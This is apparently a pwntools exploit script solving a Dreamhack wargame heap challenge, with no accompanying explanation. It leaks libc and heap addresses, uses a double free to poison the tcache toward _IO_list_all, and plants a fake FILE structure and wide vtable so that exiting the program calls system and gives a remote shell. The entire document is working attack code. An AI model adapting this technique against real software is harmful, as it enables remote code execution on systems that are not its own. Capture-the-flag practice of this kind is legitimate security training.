from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8576
r = remote(HOST, PORT)

def create(idx, sz, name, content):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'%d'%idx)
    r.sendlineafter(b'> ', b'%d'%sz)
    r.sendafter(b'> ', name)
    r.sendafter(b'> ', content)

def delete(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', b'%d'%idx)

def edit(idx, name, content):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'%d'%idx)
    r.sendafter(b'> ', name)
    r.sendafter(b'> ', content)

def read(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', b'%d'%idx)

def exit():
    r.sendlineafter(b'> ', b'5')


create(0, 0x500, b'A'*8, b'B'*8)
create(1, 0x20, b'C'*8, b'D'*8)

delete(0)
create(2, 0x500, b'A'*8, b'A')
read(2)
r.recvuntil(b'A'*8)

libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x21ace0
sh = libc + 0xebd43
system = libc + 0x50d70
binsh = libc + 0x1d8678
IO_list_all = libc + 0x21b680
valid_lock = libc + 0x21cab8

create(0, 0x20, b'A'*8, b'B'*8)
delete(0)
delete(1)

create(3, 0x40, b'A'*8, b'B'*8)
create(4, 0x20, b'A'*0x10, b'FFFFFFFF')
read(4)

r.recvuntil(b'A'*0x10)
heap = u64(r.recvline().strip().ljust(8,b'\x00'))
key = heap >> 12
target = IO_list_all ^ key

create(0, 0x20, b'A'*8, b'B'*8)
create(1, 0x20, b'C'*8, b'D'*8)
delete(1)
delete(0)
delete(0)
edit(0, p64(target), p64(target))

wide_data = heap+0x80+0x3c0
wide_vtable = heap+0x80+0x2b0
_IO_wfile_jumps = libc + 0x2170c0

file = flat({
    0x0: b'\x01\x01\x01\x01;sh\x00',
    0x88: valid_lock,
    0xa0: wide_data,
    0xc0: p32(0x1),
    0xd8: _IO_wfile_jumps
},filler=b'\x00')
create(5, 0x100, p64(heap+0x80), file)

wdata = flat({
    0x18: 0,
    0x20: 1,
    0x30: 0,
    0xe0: wide_vtable
},filler=b'\x00')

wvtable = flat({
    0x68: system
},filler=b'\x00')

create(6, 0x100, wdata, wvtable)

exit()

r.interactive()
